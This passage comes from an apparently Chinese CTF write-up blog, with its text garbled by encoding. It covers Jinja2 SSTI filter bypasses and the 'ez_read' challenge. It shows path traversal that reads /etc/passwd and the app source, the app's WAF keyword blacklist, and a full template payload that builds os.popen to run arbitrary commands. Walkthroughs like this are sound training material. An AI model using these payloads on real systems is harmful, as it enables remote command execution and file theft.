class="string">&#x27;__cl&#x27;</span>+<span class="string">&#x27;ass__&#x27;</span>] &#125;&#125;</span><br></pre></td></tr></table></figure><p>æˆ–ä½¿ç”¨Jinjia2çš„ï½å·æ‹¼æ¥</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a=<span class="string">&#x27;__cl&#x27;</span> %&#125;&#123;% <span class="built_in">set</span> b=<span class="string">&#x27;ass__&#x27;</span> %&#125;&#123;% <span class="built_in">set</span> c=<span class="string">&#x27;__ba&#x27;</span> %&#125;&#123;% <span class="built_in">set</span> d=<span class="string">&#x27;se__&#x27;</span> %&#125;&#123;&#123; ()[a~b][c~d] &#125;&#125;</span><br></pre></td></tr></table></figure><p><code>reverse()</code>è¿‡æ»¤å™¨ç»•è¿‡</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a=<span class="string">&#x27;__ssalc__&#x27;</span>|reverse %&#125;&#123;&#123; ()[a] &#125;&#125;</span><br></pre></td></tr></table></figure><p><code>join()</code>è¿‡æ»¤å™¨ç»•è¿‡</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a=<span class="built_in">dict</span>(__cl=a,ass__=a)|join %&#125;&#123;&#123; ()[a] &#125;&#125;</span><br></pre></td></tr></table></figure><p>åå…­è¿›åˆ¶ç­‰ç¼–ç äº¦å¯</p><h4 id="è¿‡æ»¤config"><a href="#è¿‡æ»¤config" class="headerlink" title="è¿‡æ»¤config"></a>è¿‡æ»¤config</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config &#125;&#125;</span><br><span class="line">&#123;&#123; get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config &#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="è·å–ç‰¹æ®Šç¬¦å·"><a href="#è·å–ç‰¹æ®Šç¬¦å·" class="headerlink" title="è·å–ç‰¹æ®Šç¬¦å·"></a>è·å–ç‰¹æ®Šç¬¦å·</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a=(lipsum|string|<span class="built_in">list</span>) %&#125;</span><br><span class="line">a[<span class="number">1</span>]ä¸ºå°äºå·,a[<span class="number">9</span>]ä¸ºç©ºæ ¼ï¼Œa[<span class="number">18</span>]ä¸ºä¸‹åˆ’çº¿</span><br></pre></td></tr></table></figure><br/><h3 id="æå®¢å¤§æŒ‘æˆ˜2025-ez-read"><a href="#æå®¢å¤§æŒ‘æˆ˜2025-ez-read" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜2025]ez_read"></a>[æå®¢å¤§æŒ‘æˆ˜2025]ez_read</h3><blockquote><p>è§„çŸ©äºŒè›Šéƒ½æŠ±æ€¨èµ·æ¥ï¼šâ€œäººå•Šï¼Œæˆ‘ä»¬è€æ—©å°±å‘Šè¯‰è¿‡ä½ ã€‚æˆ‘ä»¬çš„åå­—ä½ æœ€å¥½ä¸€ä¸ªäººçŸ¥æ™“ï¼Œä¸è¦è®©å…¶ä»–å­˜åœ¨çŸ¥é“ã€‚å¦åˆ™æˆ‘ä»¬å°±è¦ä¸ºåˆ«çš„å­˜åœ¨æ‰€ç”¨äº†ã€‚<br>ç°åœ¨å¥½äº†å§ï¼Œæ™ºæ…§è›Šå·²ç»çŸ¥é“äº†æˆ‘ä»¬çš„åå­—ï¼Œäº‹æƒ…éº»çƒ¦äº†ã€‚â€</p></blockquote><p>ç™»å½•é¶æœºï¼Œæ³¨å†Œè´¦å·æ­£å¼å¼€å§‹çœ‹é¢˜ï¼ˆå‰é¢ç™»å½•å¹¶æ²¡æœ‰ä»€ä¹ˆå¯ä»¥æ“ä½œåœ°æ–¹</p><p><code>è¯»å–æ•…äº‹</code>é¡µç»™äº†ä¸€ä¸ªè¯»å–æ–‡ä»¶çš„æ¥å£ï¼Œè¿˜æœ‰å‡ ä¸ªæ ·ä¾‹æ–‡ä»¶å¯ä»¥è¯»ï¼Œå…¶ä¸­çš„<code>3.txt</code>é‡Œé¢æœ‰æç¤º<code>åšæŒä¸‹åšæŒä¸‹å»å»</code>ï¼Œå¯ä»¥å‘ç°æ˜¯<strong>é‡å†™ç»•è¿‡</strong>ï¼Œåœ¨æ¥å£å°è¯•è·¯å¾„ç©¿è¶Š<code>../flag</code>ä¼šæŠ¥é”™<code>æ–‡ä»¶ä¸å­˜åœ¨: flag</code>ï¼Œçœ‹åˆ°æŠŠ<code>../</code>è¿›è¡Œäº†è¿‡æ»¤ï¼Œä½†æ˜¯ç»“åˆhintï¼Œå¯ä»¥é‡å†™è¿›è¡Œè·¯å¾„ç©¿è¶Šï¼Œæ¯”å¦‚<code>..././flag</code>ï¼Œæ­¤æ—¶æŠ¥é”™å˜æˆäº†<code>æ–‡ä»¶ä¸å­˜åœ¨: ../flag</code>ï¼ŒåŸå› åœ¨äºç³»ç»Ÿä¸€æ¬¡æ€§é…å¯¹äº†æ‰€æœ‰<code>../</code>è¿›è¡Œäº†æ¸…æ¥šï¼Œä½†æ˜¯æ²¡æœ‰è¿›è¡ŒäºŒæ¬¡æ£€æŸ¥ï¼Œå¯¼è‡´é‡æ–°æ‹¼æ¥åçš„å­—ç¬¦ä¸²å†ä¸€æ¬¡æ‹¼å‡‘å‡ºäº†<code>../</code></p><br/><p>è¿˜æœ‰æ¯”è¾ƒæ›²æŠ˜çš„åŠæ³•æ˜¯ç”¨ç»å¯¹è·¯å¾„ï¼Œæ”¾è¿™é‡Œå½“æ˜¯ç†Ÿæ‚‰Linuxæ–‡ä»¶ç»“æ„äº†ï¼Œè®¿é—®<code>/ect/passwd</code>**ï¼ˆ Linux&#x2F;Unix ç³»ç»Ÿä¸­çš„ç”¨æˆ·è´¦æˆ·ä¿¡æ¯æ–‡ä»¶ï¼‰**ä¼šæœ‰å¦‚ä¸‹å›æ˜¾</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">_apt:x:42:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">ctf:x:1000:1000::/opt/___web_very_strange_42___:/bin/sh</span><br></pre></td></tr></table></figure><p>æ–‡ä»¶çš„æœ€åä¸€è¡Œæœ‰ä¸€ä¸ªç‰¹æ®Šç”¨æˆ·<code>ctf</code>ï¼Œå®ƒçš„å®¶ç›®å½•å¾ˆå¥‡æ€ªï¼Œå¯ä»¥å…ˆé”å®šè¿™ä¸ªç›®å½•</p><p>å°è¯•æŸ¥è¯¢<code>/proc/self/cmdline</code><strong>ï¼ˆLinux ç³»ç»Ÿä¸­ä¸€ä¸ªç‰¹æ®Šçš„è™šæ‹Ÿæ–‡ä»¶ï¼Œå®ƒæä¾›äº†å½“å‰è¿›ç¨‹çš„å®Œæ•´å‘½ä»¤è¡Œä¿¡æ¯ï¼‰</strong>ï¼Œä¼šæœ‰ä»¥ä¸‹å›æ˜¾</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">python3app.py</span><br></pre></td></tr></table></figure><p>ç»“åˆä¸¤æ¬¡å›æ˜¾ï¼Œç›´æ¥ç”¨ç»å¯¹è·¯å¾„è®¿é—®<code>/opt/___web_very_strange_42___/app.py</code>ä¹Ÿå¯ä»¥è¯»æºç </p><br/><p>å¯ä»¥åˆ©ç”¨è·¯å¾„éå†å»å¯»æ‰¾æºç ï¼Œå°è¯•å¤šæ¬¡ä½¿ç”¨<code>..././app.py</code>å³å¯è¯»å–æºç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string, redirect, url_for, session</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, template_folder=<span class="string">&quot;templates&quot;</span>, static_folder=<span class="string">&quot;static&quot;</span>)</span><br><span class="line">app.secret_key = <span class="string">&quot;key_ciallo_secret&quot;</span></span><br><span class="line"></span><br><span class="line">USERS = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">payload: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> payload:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(payload) <span class="keyword">not</span> <span class="keyword">in</span> (<span class="number">114</span>, <span class="number">514</span>):</span><br><span class="line">        <span class="keyword">return</span> payload.replace(<span class="string">&quot;(&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        waf = [<span class="string">&quot;__class__&quot;</span>, <span class="string">&quot;__base__&quot;</span>, <span class="string">&quot;__subclasses__&quot;</span>, <span class="string">&quot;__globals__&quot;</span>, <span class="string">&quot;import&quot;</span>,<span class="string">&quot;self&quot;</span>,<span class="string">&quot;session&quot;</span>,<span class="string">&quot;blueprints&quot;</span>,<span class="string">&quot;get_debug_flag&quot;</span>,<span class="string">&quot;json&quot;</span>,<span class="string">&quot;get_template_attribute&quot;</span>,<span class="string">&quot;render_template&quot;</span>,<span class="string">&quot;render_template_string&quot;</span>,<span class="string">&quot;abort&quot;</span>,<span class="string">&quot;redirect&quot;</span>,<span class="string">&quot;make_response&quot;</span>,<span class="string">&quot;Response&quot;</span>,<span class="string">&quot;stream_with_context&quot;</span>,<span class="string">&quot;flash&quot;</span>,<span class="string">&quot;escape&quot;</span>,<span class="string">&quot;Markup&quot;</span>,<span class="string">&quot;MarkupSafe&quot;</span>,<span class="string">&quot;tojson&quot;</span>,<span class="string">&quot;datetime&quot;</span>,<span class="string">&quot;cycler&quot;</span>,<span class="string">&quot;joiner&quot;</span>,<span class="string">&quot;namespace&quot;</span>,<span class="string">&quot;lipsum&quot;</span>]</span><br><span class="line">        <span class="keyword">for</span> w <span class="keyword">in</span> waf:</span><br><span class="line">            <span class="keyword">if</span> w <span class="keyword">in</span> payload:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">f&quot;waf&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    user = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, user=user)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/register&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = (request.form.get(<span class="string">&quot;username&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&quot;password&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>, error=<span class="string">&quot;ç”¨æˆ·åå’Œå¯†ç ä¸èƒ½ä¸ºç©º&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> USERS:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>, error=<span class="string">&quot;ç”¨æˆ·åå·²å­˜åœ¨&quot;</span>)</span><br><span class="line">        USERS[username] = &#123;<span class="string">&quot;password&quot;</span>: password&#125;</span><br><span class="line">        session[<span class="string">&quot;user&quot;</span>] = username</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;profile&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = (request.form.get(<span class="string">&quot;username&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>).strip()</span><br><span class="line">        password = request.form.get(<span class="string">&quot;password&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        user = USERS.get(username)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user <span class="keyword">or</span> user.get(<span class="string">&quot;password&quot;</span>) != password:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>, error=<span class="string">&quot;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&quot;</span>)</span><br><span class="line">        session[<span class="string">&quot;user&quot;</span>] = username</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;profile&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.clear()</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/profile&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    user = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    name_raw = request.args.get(<span class="string">&quot;name&quot;</span>, user)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        filtered = waf(name_raw)</span><br><span class="line">        tmpl = <span class="string">f&quot;æ¬¢è¿ï¼Œ<span class="subst">&#123;filtered&#125;</span>&quot;</span></span><br><span class="line">        rendered_snippet = render_template_string(tmpl)</span><br><span class="line">        error_msg = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        rendered_snippet = <span class="string">&quot;&quot;</span></span><br><span class="line">        error_msg = <span class="string">f&quot;æ¸²æŸ“é”™è¯¯: <span class="subst">&#123;e&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(</span><br><span class="line">        <span class="string">&quot;profile.html&quot;</span>,</span><br><span class="line">        content=rendered_snippet,</span><br><span class="line">        name_input=name_raw,</span><br><span class="line">        user=user,</span><br><span class="line">        error_msg=error_msg,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/read&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>():</span><br><span class="line">    user = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line">    base_dir = os.path.join(os.path.dirname(__file__), <span class="string">&quot;story&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        entries = <span class="built_in">sorted</span>([f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(base_dir) <span class="keyword">if</span> os.path.isfile(os.path.join(base_dir, f))])</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        entries = []</span><br><span class="line"></span><br><span class="line">    filename = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        filename = request.form.get(<span class="string">&quot;filename&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        filename = request.args.get(<span class="string">&quot;filename&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    content = <span class="literal">None</span></span><br><span class="line">    error = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> filename:</span><br><span class="line">        sanitized = filename.replace(<span class="string">&quot;../&quot;</span>, <span class="string">&quot;&quot;</span>)//å¯ä»¥çœ‹åˆ°è¿™é‡Œåªè¿›è¡Œäº†ä¸€æ¬¡åŒ¹é…æ›¿æ¢</span><br><span class="line">        target_path = os.path.join(base_dir, sanitized)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(target_path):</span><br><span class="line">            error = <span class="string">f&quot;æ–‡ä»¶ä¸å­˜åœ¨: <span class="subst">&#123;sanitized&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(target_path, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                content = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;read.html&quot;</span>, files=entries, content=content, filename=filename, error=error, user=user)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>çœ‹å‡ºæ¥æ˜¯SSTIæ³¨å…¥ï¼Œæºç çš„é‡ç‚¹åœ¨</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(payload) <span class="keyword">not</span> <span class="keyword">in</span> (<span class="number">114</span>, <span class="number">514</span>):</span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">&quot;(&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    waf = [<span class="string">&quot;__class__&quot;</span>, <span class="string">&quot;__base__&quot;</span>, <span class="string">&quot;__subclasses__&quot;</span>, <span class="string">&quot;__globals__&quot;</span>, <span class="string">&quot;import&quot;</span>,<span class="string">&quot;self&quot;</span>,<span class="string">&quot;session&quot;</span>,<span class="string">&quot;blueprints&quot;</span>,<span class="string">&quot;get_debug_flag&quot;</span>,<span class="string">&quot;json&quot;</span>,<span class="string">&quot;get_template_attribute&quot;</span>,<span class="string">&quot;render_template&quot;</span>,<span class="string">&quot;render_template_string&quot;</span>,<span class="string">&quot;abort&quot;</span>,<span class="string">&quot;redirect&quot;</span>,<span class="string">&quot;make_response&quot;</span>,<span class="string">&quot;Response&quot;</span>,<span class="string">&quot;stream_with_context&quot;</span>,<span class="string">&quot;flash&quot;</span>,<span class="string">&quot;escape&quot;</span>,<span class="string">&quot;Markup&quot;</span>,<span class="string">&quot;MarkupSafe&quot;</span>,<span class="string">&quot;tojson&quot;</span>,<span class="string">&quot;datetime&quot;</span>,<span class="string">&quot;cycler&quot;</span>,<span class="string">&quot;joiner&quot;</span>,<span class="string">&quot;namespace&quot;</span>,<span class="string">&quot;lipsum&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> waf:</span><br><span class="line">        <span class="keyword">if</span> w <span class="keyword">in</span> payload:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;waf&quot;</span>)</span><br></pre></td></tr></table></figure><p>å½“<code>name</code>ä¼ å‚çš„å­—ç¬¦ä¸²é•¿åº¦ä¸ä¸º114æˆ–514æ—¶ï¼Œå®ƒä¼šåˆ é™¤å†…å®¹ä¸­æ‰€æœ‰çš„å·¦æ‹¬å·ï¼Œå½“é•¿åº¦ç­‰äº114æˆ–514æ—¶ï¼Œåˆ™ä¼šè¿›è¡Œwafé»‘åå•è¿‡æ»¤ï¼Œå°è¯•ç»•è¿‡å·¦æ‹¬å·æ˜¯ä¸å¯èƒ½çš„ï¼Œè¿™é‡Œåªèƒ½è¿›è¡Œé»‘åå•ç»•è¿‡</p><p>æ¥ä¸‹æ¥ç ”è¯»<a href="https://wwwmarin.xyz/">@marin</a>å¸ˆå‚…æ“çš„payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(<span class="keyword">in</span>=a,it=a)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(glo=a,bals=a)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getitem=(a,a,<span class="built_in">dict</span>(get=a,item=a)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> popen=<span class="built_in">dict</span>(popen=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> read=<span class="built_in">dict</span>(read=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> o=<span class="built_in">dict</span>(os=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cmd=(request.values.a) %&#125;</span><br><span class="line">&#123;&#123; (url_for|attr(glo))|attr(getitem)(o)|attr(popen)(cmd)|attr(read)() &#125;&#125;<span class="number">11111111111111111111111111111111111111111111111111111111111111111111111</span>  //å­—ç¬¦é•¿åº¦ä¸º<span class="number">514</span></span><br></pre></td></tr></table></figure><br/><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join %&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªå˜é‡<code>p</code>ï¼Œ<code>dict(po=a,p=a)</code>åˆ›å»ºäº†ä¸€ä¸ªå­—å…¸ï¼Œç„¶ååˆ©ç”¨<code>|join</code>è¿‡æ»¤å™¨å°†é”®åæ‹¼æ¥è¿”å›å­—ç¬¦ä¸²ï¼Œæœ€å<code>p=pop</code></p><br/><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>) %&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ Jinja2 ä¸­ä½¿ç”¨ <code>select</code> è¿‡æ»¤å™¨è·å¾—ç”Ÿæˆå™¨å¯¹è±¡ï¼Œè¾“å‡ºç±»ä¼¼äº<code>&lt;generator object select_or_reject at 0x7f8334407e20&gt;</code>ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªæ„å»º<code>&quot;_&quot;</code></p><p>å½“æœ‰æ•ˆè¾“å…¥ä¸º<code>&#123;% set a=(''|select|string|list) %&#125;&#123;% print a %&#125;</code>æ—¶ï¼Œé¡µé¢çš„æœ‰æ•ˆå›æ˜¾æ˜¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>]</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨å‰é¢æ„å»ºçš„<code>pop</code>å‡½æ•°æå–åºå·ä¸º24çš„å­—ç¬¦å°±å®Œæˆäº†ä¸‹åˆ’çº¿çš„æ„å»º</p><br/><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(<span class="keyword">in</span>=a,it=a)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(glo=a,bals=a)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getitem=(a,a,<span class="built_in">dict</span>(get=a,item=a)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> popen=<span class="built_in">dict</span>(popen=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> read=<span class="built_in">dict</span>(read=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> o=<span class="built_in">dict</span>(os=a)|join %&#125;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„æ„å»ºäº†<code>__init__</code>ã€<code>__globals__</code>ã€<code>__getitem__</code>ã€<code>popen</code>ã€<code>read</code>å’Œ<code>os</code>ï¼ŒåŸç†åŒç¬¬ä¸€æ¡</p><br/><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> cmd=(request.values.a) %&#125;</span><br></pre></td></tr></table></figure><p>åˆ›å»ºå˜é‡<code>cmd</code>ï¼Œå®ƒçš„å€¼ç­‰äºGETä¼ å…¥çš„å‚æ•°<code>a</code>çš„å€¼</p><br/><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; (url_for|attr(glo))|attr(getitem)(o)|attr(popen)(cmd)|attr(read)() 